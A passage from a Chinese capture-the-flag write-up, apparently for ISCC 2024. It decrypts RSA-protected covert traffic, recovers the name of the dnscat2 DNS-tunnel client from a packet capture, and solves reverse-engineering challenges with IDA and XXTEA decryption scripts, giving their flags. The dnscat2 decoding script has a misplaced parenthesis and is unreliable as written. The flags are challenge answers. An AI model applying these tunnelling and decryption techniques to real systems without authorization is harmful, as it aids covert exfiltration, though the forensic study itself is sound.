<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> unquote</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes, bytes_to_long</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"></span><br><span class="line"><span class="comment"># RSA公钥和私钥定义</span></span><br><span class="line">pubkey_str = <span class="string">&quot;&quot;&quot;-----BEGIN PUBLIC KEY-----</span></span><br><span class="line"><span class="string">MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCK/qv5P8ixWjoFI2rzF62tm6sDFnRsKsGhVSCuxQIxuehMWQLmv6TPxyTQPefIKufzfUFaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41QIDAQAB</span></span><br><span class="line"><span class="string">-----END PUBLIC KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">prikey_str = <span class="string">&quot;&quot;&quot;-----BEGIN PRIVATE KEY-----</span></span><br><span class="line"><span class="string">MIICdgIBADANBgkqhkiG9w0BAQEFAASCAmAwggJcAgEAAoGBAIr+q/k/yLFaOgUjavMXra2bqwMWdGwqwaFVIK7FAjG56ExZAua/pM/HJNA958gq5/N9QVaca/YHkIVIC19ohmE5X738TtxGbOgiGef4bvd9sU6M42k8vMlCPJp1woDFDOFoBQpr4YzH4ZTR6Ps+HP8VEIJMG5uiLQOLxdKdxi41AgMBAAECgYBDsqawT5DAUOHRft6oZ+//jsJMTrOFu41ztrKkbPAUqCesh+4R1WXAjY4wnvY1WDCBN5CNLLIo4RPuli2R81HZ4OpZuiHv81sNMccauhrJrioDdbxhxbM7/jQ6M9YajwdNisL5zClXCOs1/y01+9vDiMDk0kX8hiIYlpPKDwjqQQJBAL6Y0fuoJng57GGhdwvN2c656tLDPj9GRi0sfeeMqavRTMz6/qea1LdAuzDhRoS2Wb8ArhOkYns0GMazzc1q428CQQC6sM9OiVR4EV/ewGnBnF+0p3alcYr//Gp1wZ6fKIrFJQpbHTzf27AhKgOJ1qB6A7P/mQS6JvYDPsgrVkPLRnX7AkEAr/xpfyXfB4nsUqWFR3f2UiRmx98RfdlEePeo9YFzNTvX3zkuo9GZ8e8qKNMJiwbYzT0yft59NGeBLQ/eynqUrwJAE6Nxy0Mq/Y5mVVpMRa+babeMBY9SHeeBk22QsBFlt6NT2Y3Tz4CeoH547NEFBJDLKIICO0rJ6kF6cQScERASbQJAZy088sVY6DJtGRLPuysv3NiyfEvikmczCEkDPex4shvFLddwNUlmhzml5pscIie44mBOJ0uX37y+co3q6UoRQg==</span></span><br><span class="line"><span class="string">-----END PRIVATE KEY-----</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 导入RSA公钥与私钥</span></span><br><span class="line">pubkey = RSA.import_key(pubkey_str)</span><br><span class="line">prikey = RSA.import_key(prikey_str)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义Base64替换规则</span></span><br><span class="line">base64_replacements = &#123;</span><br><span class="line">    <span class="string">&quot;/&quot;</span>: <span class="string">&quot;e5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM&quot;</span>,</span><br><span class="line">    <span class="string">&quot;+&quot;</span>: <span class="string">&quot;n6&amp;B8G6nE@2tt4UR6h3QBt*5&amp;C&amp;pVu8W&quot;</span>,</span><br><span class="line">    <span class="string">&quot;=&quot;</span>: <span class="string">&quot;JXWUDuLUgwRLKD9fD6&amp;VY2aFeE&amp;r@Ff2&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># 替换Base64编码中的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_base64_replace</span>(<span class="params">b64_str</span>):</span><br><span class="line">    <span class="keyword">for</span> original, replacement <span class="keyword">in</span> base64_replacements.items():</span><br><span class="line">        b64_str = b64_str.replace(original, replacement)</span><br><span class="line">    <span class="keyword">return</span> b64_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># 反向替换Base64编码中的字符</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">reverse_custom_base64_replace</span>(<span class="params">b64_str</span>):</span><br><span class="line">    <span class="keyword">for</span> replacement, original <span class="keyword">in</span> base64_replacements.items():</span><br><span class="line">        b64_str = b64_str.replace(replacement, original)</span><br><span class="line">    <span class="keyword">return</span> b64_str</span><br><span class="line"></span><br><span class="line"><span class="comment"># 加密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">plaintext</span>):</span><br><span class="line">    encrypted_chunks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(plaintext), <span class="number">128</span>):</span><br><span class="line">        chunk = plaintext[i:i+<span class="number">128</span>]</span><br><span class="line">        encrypted_chunk = <span class="built_in">pow</span>(bytes_to_long(chunk), prikey.d, pubkey.n)</span><br><span class="line">        encrypted_chunks.append(long_to_bytes(encrypted_chunk))</span><br><span class="line">    encrypted_data = <span class="string">b&#x27;&#x27;</span>.join(encrypted_chunks)</span><br><span class="line">    encoded_data = custom_base64_replace(base64.b64encode(encrypted_data).decode())</span><br><span class="line">    <span class="keyword">return</span> encoded_data</span><br><span class="line"></span><br><span class="line"><span class="comment"># 解密函数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">ciphertext_url_encoded</span>):</span><br><span class="line">    ciphertext_url_decoded = unquote(ciphertext_url_encoded)</span><br><span class="line">    ciphertext_decoded = reverse_custom_base64_replace(ciphertext_url_decoded)</span><br><span class="line">    ciphertext_data = base64.b64decode(ciphertext_decoded)</span><br><span class="line">    decrypted_chunks = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(ciphertext_data), <span class="number">128</span>):</span><br><span class="line">        chunk = ciphertext_data[i:i+<span class="number">128</span>]</span><br><span class="line">        decrypted_chunk = <span class="built_in">pow</span>(bytes_to_long(chunk), pubkey.e, pubkey.n)</span><br><span class="line">        decrypted_chunks.append(long_to_bytes(decrypted_chunk))</span><br><span class="line">    decrypted_text = <span class="string">b&#x27;&#x27;</span>.join(decrypted_chunks)</span><br><span class="line">    <span class="keyword">return</span> decrypted_text</span><br><span class="line"></span><br><span class="line"><span class="comment"># 主程序</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    ciphertext = <span class="string">&quot;Ie5Lg^FM5EQYe5!yF&amp;62%V$UG*B*RfQeM...[省略的长字符串]...&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;加密数据: <span class="subst">&#123;ciphertext&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">    decrypted_text = decrypt(ciphertext)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;解密数据: <span class="subst">&#123;decrypted_text&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>







<h4 id="数据泄露"><a href="#数据泄露" class="headerlink" title="数据泄露"></a>数据泄露</h4><p>研究了一下</p>
<p>找到了一道[相似的题](<a target="_blank" rel="noopener" href="https://www.ips99.com/show/4/535735.html">https://www.ips99.com/show/4/535735.html</a> task4)</p>
<p>根据这个打</p>
<p>选取所有192.168.157.144与192.168.157.145通信的数据包，且大小在 200 以上</p>
<p>wireshark打开</p>
<blockquote>
<p>ip.src eq 192.168.157.145  &amp;&amp;  ip.dst eq 192.168.157.144 &amp;&amp; udp.length &gt;200 </p>
</blockquote>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3641c2a.png" alt="image-20240525153214882"></p>
<p>dnscat2流量</p>
<p>导出为纯文本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"><span class="comment"># 定义文件路径</span></span><br><span class="line">input_file_path = <span class="string">r&#x27;D:\流量\1.txt&#x27;</span></span><br><span class="line">output_file_path = <span class="string">r&#x27;D:\流量\2.txt&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取并解析域名</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(input_file_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    lines = file.readlines()</span><br><span class="line">domains = [</span><br><span class="line">    re.sub(<span class="string">r&#x27;\.microsofto365\..*&#x27;</span>, <span class="string">&#x27;111&#x27;</span>, line)</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> lines</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">clean_domains = [</span><br><span class="line">    <span class="keyword">match</span>.group(<span class="number">1</span>)[<span class="number">18</span>:].replace(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> domain <span class="keyword">in</span> domains</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">match</span> := re.search(<span class="string">r&#x27;Name: (.*?)111&#x27;</span>, domain))</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串</span></span><br><span class="line">decoded_word = <span class="string">&#x27;&#x27;</span>.join(</span><br><span class="line">    <span class="built_in">chr</span>(<span class="built_in">int</span>(substring, <span class="number">16</span>) <span class="keyword">for</span> domain <span class="keyword">in</span> clean_domains <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(domain), <span class="number">2</span>) <span class="keyword">for</span> substring <span class="keyword">in</span> (domain[i:i+<span class="number">2</span>])</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 写入到文件</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(output_file_path, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">    file.write(decoded_word)</span><br></pre></td></tr></table></figure>

<p>跑下脚本处理一下</p>
<p>查看2.txt</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc363fe09.png" alt="image-20240525153527666"></p>
<p>由此得到原始的工具名为dnscat2-v0.07-client-win32.exe</p>
<p>md5加密</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc3565927.png" alt="image-20240525153734295"></p>
<h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="练武题-1"><a href="#练武题-1" class="headerlink" title="练武题"></a>练武题</h3><h4 id="迷失之门"><a href="#迷失之门" class="headerlink" title="迷失之门"></a>迷失之门</h4><p>IDA打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7994b16.png" alt="image-20240502115709593"></p>
<p>TAB&#x2F;F5：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc797b0d5.png" alt="image-20240502115816894"></p>
<p>跟进check</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc796f29f.png" alt="image-20240502120305168"></p>
<p>继续跟进check_2</p>
<p>R转换result</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7833aee.png" alt="image-20240502120439849"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7862bb2.png" alt="image-20240502120535560"></p>
<p>得到：</p>
<p>FSBBhKhLgEdDDKeidOpktsBNRI6</p>
<p>跑脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">x=<span class="string">&#x27;FSBBhKhLgEdDDKeidOpktsBNRI6&#x27;</span><span class="comment">#输入比较的字符</span></span><br><span class="line">W=<span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">w=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span></span><br><span class="line">M=<span class="string">&#x27;0123456789+/-=!#&amp;*()?;:*^%&#x27;</span></span><br><span class="line">v=<span class="string">&#x27;DABBZXQESVFRWNGTHYJUMKIOLPC&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>,<span class="number">127</span>):</span><br><span class="line">        <span class="keyword">if</span> j-<span class="built_in">ord</span>(v[i])&lt;=<span class="number">0</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            v22=j-<span class="built_in">ord</span>(v[i])</span><br><span class="line">            <span class="keyword">if</span> v22&gt;<span class="number">25</span>:</span><br><span class="line">                <span class="keyword">if</span> v22&gt;<span class="number">51</span>:</span><br><span class="line">                    v1=M[v22-<span class="number">52</span>]</span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    v1=w[v22-<span class="number">26</span>]</span><br><span class="line">                <span class="keyword">if</span> v1==x[i]:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">if</span> W[v22]==x[i]:</span><br><span class="line">                    <span class="built_in">print</span>(<span class="built_in">chr</span>(j),end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7995bbc.png" alt="image-20240502121808043"></p>
<p>ISCC{brPsZcUZXevegsyzwJ]X}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc789a55a.png" alt="image-20240502121859811"></p>
<h4 id="Badcode"><a href="#Badcode" class="headerlink" title="Badcode"></a>Badcode</h4><blockquote>
<p>好学的小明又开始学习c++了，他猛猛写了一堆代码，并且很高兴实现了功能，但是我们发现，他的代码写的真的很差，这次他又将自己的秘密藏在里面，你能揭穿他的秘密吗？</p>
</blockquote>
<p>把附件拉入IDA Tab&#x2F;f5</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc78b2456.png" alt="image-20240502220802580"></p>
<p>把数字Buf2转成16进制</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc783e7be.png" alt="image-20240502220952379"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7842ddb.png" alt="image-20240502221035159"></p>
<p>跑脚本：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shift</span>(<span class="params">z, y, x, k, p, e</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((z &gt;&gt; <span class="number">5</span>) ^ (y &lt;&lt; <span class="number">2</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (z &lt;&lt; <span class="number">4</span>))) ^ ((x ^ y) + (k[(p &amp; <span class="number">3</span>) ^ e] ^ z)))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = <span class="number">0</span></span><br><span class="line">    z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        x = (x - delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">            y = v[p + <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            z = v[p]</span><br><span class="line">        p += <span class="number">1</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        v[n - <span class="number">1</span>] = (v[n - <span class="number">1</span>] + shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, k</span>):</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line">    n = <span class="built_in">len</span>(v)</span><br><span class="line">    rounds = <span class="number">6</span> + <span class="number">52</span> // n</span><br><span class="line">    x = (<span class="number">0</span> - rounds * delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(rounds):</span><br><span class="line">        e = (x &gt;&gt; <span class="number">2</span>) &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] = (v[p] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">            y = v[p]</span><br><span class="line">        p -= <span class="number">1</span></span><br><span class="line">        z = v[n - <span class="number">1</span>]</span><br><span class="line">        v[<span class="number">0</span>] = (v[<span class="number">0</span>] - shift(z, y, x, k, p, e)) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line">        x = (x + delta) &amp; <span class="number">0xFFFFFFFF</span></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    plain = [<span class="number">0xE2122B60</span>, <span class="number">0x6A5F5FB9</span>, <span class="number">0x8B00D411</span>, <span class="number">0x85672DCF</span>, <span class="number">0xCA65C318</span>, <span class="number">0x2757DF85</span>]  <span class="comment"># 输入比较的字符</span></span><br><span class="line">    key = [<span class="number">0x12345678</span>, <span class="number">0x9ABCDEF0</span>, <span class="number">0xFEDCBA98</span>, <span class="number">0x76543210</span>]</span><br><span class="line">    decrypted = decrypt(plain, key)</span><br><span class="line">    flag = []</span><br><span class="line">    v16 = <span class="string">&#x27;674094872038771148666737&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        x = long_to_bytes(decrypted[i])</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">            flag.append(x[j])</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(flag)):</span><br><span class="line">        flag[i] ^= <span class="built_in">ord</span>(v16[i]) - <span class="number">0x30</span></span><br><span class="line">        <span class="keyword">if</span> i % <span class="number">2</span>:</span><br><span class="line">            flag[i] -= <span class="number">2</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flag[i] += <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">bytes</span>(flag))</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc79a6fd9.png" alt="image-20240502222819278"></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7867d42.png" alt="image-20240502223320773"></p>
<h4 id="DLLCode"><a href="#DLLCode" class="headerlink" title="DLLCode"></a>DLLCode</h4><p>一样把附件拖进IDA</p>
<p>附件有两个：</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc782b148.png" alt="image-20240502224944138"></p>
<p>f5打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc793d8f0.png" alt="image-20240502225943304"></p>
<p>同样发现一个数组</p>
<p>跑脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmp = [<span class="number">0</span>,<span class="number">16</span>,<span class="number">56</span>,<span class="number">114</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">116</span>,<span class="number">43</span>,<span class="number">27</span>,<span class="number">25</span>,<span class="number">20</span>,<span class="number">3</span>,<span class="number">67</span>,<span class="number">109</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">70</span>,<span class="number">84</span>,<span class="number">64</span>,<span class="number">103</span>,<span class="number">116</span>,<span class="number">125</span>,<span class="number">80</span>,<span class="number">64</span>]</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\流量\attachment-7\BEIXUAN-8.exe&quot;</span>, <span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    tmp = f.read()</span><br><span class="line">    <span class="keyword">if</span> tmp[<span class="number">0</span>:<span class="number">3</span>] == <span class="string">b&#x27;\x4d\x5a\x50&#x27;</span>:</span><br><span class="line">        start = <span class="number">0x0b3614</span> + <span class="number">0xcc8</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        start = <span class="number">0xcc8</span></span><br><span class="line">    cmp = [tmp[start + i * <span class="number">10</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>)]</span><br><span class="line">inp1 = cmp[:<span class="number">12</span>]</span><br><span class="line">v7 = cmp[<span class="number">12</span>:]</span><br><span class="line">v4 = [<span class="number">2</span>, <span class="number">0</span>, <span class="number">3</span>, <span class="number">1</span>, <span class="number">6</span>, <span class="number">4</span>, <span class="number">7</span>, <span class="number">5</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">11</span>, <span class="number">9</span>]</span><br><span class="line">inp2 = [<span class="number">0</span>] * <span class="number">12</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp2)):</span><br><span class="line">    inp2[i] = v7[v4[i]]</span><br><span class="line"></span><br><span class="line">key = <span class="string">&#x27;ISCC&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp1)):</span><br><span class="line">    inp1[i] ^= <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(inp1)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(inp1[i]) + <span class="built_in">chr</span>(inp2[i]), end=<span class="string">&#x27;&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc799d45b.png" alt="image-20240502231023964"></p>
<p>ISCC{Y1mC@VF7ghTRPJtW@@}</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc78cfb97.png" alt="image-20240502231053377"></p>
<h4 id="CrypticConundrum"><a href="#CrypticConundrum" class="headerlink" title="CrypticConundrum"></a>CrypticConundrum</h4><p>IDA打开</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc786d121.png" alt="image-20240502232113334"></p>
<p>只有两个函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc782a170.png" alt="image-20240503002452778"></p>
<p>upx-d脱壳</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" onerror="this.onerror=null,this.src=&quot;/img/404.jpg&quot;" data-lazy-src="https://bu.dusays.com/2024/05/25/6651fc7858950.png" alt="image-20240503003218282"></p>
<p>再跑脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">cmp = []</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&quot;D:\流量\cryptic.exe&quot;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    tmp = f.read()</span><br><span class="line">    cmp += tmp[<span class="number">0x1210</span> + <span class="number">2</span>:<span class="number">0x1210</span> + <span class="number">2</span> + <span class="number">8</span>]</span><br><span class="line">    cmp += tmp[<span class="number">0x121e</span> + <span class="number">2</span>:<span class="number">0x121e</span> + <span class="number">2</span> + <span class="number">8</span>]</span><br><span class="line">    cmp += tmp[<span class="number">0x122c</span> + <span class="number">2</span>:<span class="number">0x122c</span> + <span class="number">2</span> + <span class="number">8</span>]</span><br><span class="line">    cmp[<span class="number">22</span>:<span class="number">28</span>] = tmp[<span class="number">0x123a</span> + <span class="number">4</span>:<span class="number">0x123a</span> + <span class="number">4</span> + <span class="number">4</span>]</span><br><span class="line">key1 = <span class="string">&#x27;So--this-is-the-right-flag&#x27;</span></span><br><span class="line">key1_ = []</span><br><span class="line">key2 = <span class="string">&#x27;ISCC&#x27;</span></span><br><span 